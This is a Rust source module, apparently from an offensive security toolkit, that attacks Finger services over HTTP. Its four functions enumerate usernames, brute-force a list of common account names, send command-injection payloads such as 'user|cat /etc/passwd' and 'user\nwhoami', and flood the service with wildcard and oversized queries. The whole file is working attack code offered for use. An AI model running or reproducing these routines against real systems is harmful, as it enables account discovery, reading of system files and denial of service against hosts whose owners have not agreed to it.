use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none())
        .build()
        .unwrap_or_else(|_| Client::new())
}

pub async fn enumerate(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Finger Enumeration", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let users = [
        "root", "admin", "guest", "user", "test", "daemon", "bin", "sys", "nobody", "operator",
    ];
    for user in &users {
        let target = format!("{}?{}", url, user);
        if let Ok(r) = client.get(&target).send().await {
            let status = r.status().as_u16();
            let text = r.text().await.unwrap_or_default();
            if status == 200 && !text.is_empty() {
                println!(
                    "  {} {:15} — {} bytes",
                    "[+]".green().bold(),
                    user,
                    text.len()
                );
            }
        }
    }

    Ok(())
}

pub async fn brute(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Finger User Brute Force", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let users = [
        "root",
        "admin",
        "administrator",
        "operator",
        "guest",
        "user",
        "test",
        "demo",
        "service",
        "ftp",
        "mail",
        "www",
        "nginx",
        "postgres",
        "mysql",
        "redis",
        "git",
        "jenkins",
        "docker",
        "ansible",
    ];

    for user in &users {
        let target = format!("{}?{}", url, user);
        if let Ok(r) = client.get(&target).send().await {
            let status = r.status().as_u16();
            let text = r.text().await.unwrap_or_default();
            if status == 200 && !text.is_empty() && !text.contains("no such user") {
                println!("  {} {:15} — EXISTS", "[+]".green().bold(), user);
            }
        }
    }

    Ok(())
}

pub async fn redirect(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Finger Redirect Attack", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let redirect_payloads = [
        ("Chain redirect", "user@host1@host2"),
        ("Cross query", "user@other-host.com"),
        ("Pipe inject", "user|cat /etc/passwd"),
        ("Newline inject", "user\nwhoami"),
    ];

    for (name, payload) in &redirect_payloads {
        let target = format!("{}?{}", url, payload);
        match client.get(&target).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                if status == 200 && !text.is_empty() {
                    println!(
                        "  {} {:20} — {} bytes",
                        "[+]".green().bold(),
                        name,
                        text.len()
                    );
                } else {
                    println!("  {} {:20} — status={}", "[-]".dimmed(), name, status);
                }
            }
            Err(_) => println!("  {} {:20} — error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}

pub async fn bomb(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Finger Bomb Test", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let bomb_payloads = [
        ("Wildcard", ".*"),
        ("All users", "@"),
        ("Long query", &"a".repeat(1000)),
        ("Multiple wildcards", "*@*@*@*"),
    ];

    for (name, payload) in &bomb_payloads {
        let target = format!("{}?{}", url, payload);
        match client.get(&target).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                if status == 200 && !text.is_empty() {
                    println!(
                        "  {} {:20} — {} bytes returned",
                        "[!]".red().bold(),
                        name,
                        text.len()
                    );
                } else {
                    println!("  {} {:20} — status={}", "[-]".dimmed(), name, status);
                }
            }
            Err(_) => println!("  {} {:20} — error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}
